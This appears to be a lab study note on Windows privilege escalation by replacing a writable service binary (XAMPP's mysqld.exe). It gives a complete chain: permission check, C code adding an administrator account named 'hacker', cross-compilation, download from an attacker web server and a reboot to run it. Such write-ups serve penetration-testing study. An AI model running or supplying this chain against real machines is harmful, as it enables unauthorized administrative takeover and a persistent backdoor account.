# Binary Hijacking

---

If we have full access on an .exe, we can replace it with an malicious binary to elevate our privileges.

## PoC

```
PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)

Successfully processed 1 files; Failed processing 0 files
```

Created an malicious .c script on my kali linux machine, which will create an user named "hacker" with administrator privs.

```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user hacker password123! /add");
  i = system ("net localgroup administrators hacker /add");
  
  return 0;
}
```

Compile the malicious code to an binary.

```
x86_64-w64-mingw32-gcc adduser.c -o mysqld.exe
```

Next step is to change the binary's name on the target system.

```
mv mysqld.exe mysqld-backup.exe
```

Let's download our binary onto the target system now.

Setting up an python web server locally.

```
python3 -m http.server 80
```

Downloaded binary.

```
iwr -uri http://192.168.45.229/mysqld.exe -OutFile C:\xampp\mysql\bin\mysqld.exe
```

We now need to somehow execute the binary, let's stop the service mysql and restart it.

```
net stop mysql
```

Access denied! Which makes sense. Since Administrator User manage those applications.

Since we do not have permission to manually restart the service, we must consider another approach. If the service Startup Type is set to "Automatic", we may be able to restart the service by rebooting the machine.

```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

It's set to "Automatic"!

We now need to check if our current user has the "SeShutdownPrivilege" in order to restart the machine, which automatically will execute our malicious binary.

```
whoami /priv
```

It's visually there which means we can use it, but the state seems to be "Disabled". 

We should still be able to execute it tho.

Rebooted the machine.

```
shutdown /r /t 0
```

Since our binary will be executed, there should be a new user called "hacker" on the target system.

Let's check the Administrator Group.

```
Get-LocalGroupMember administrators
```
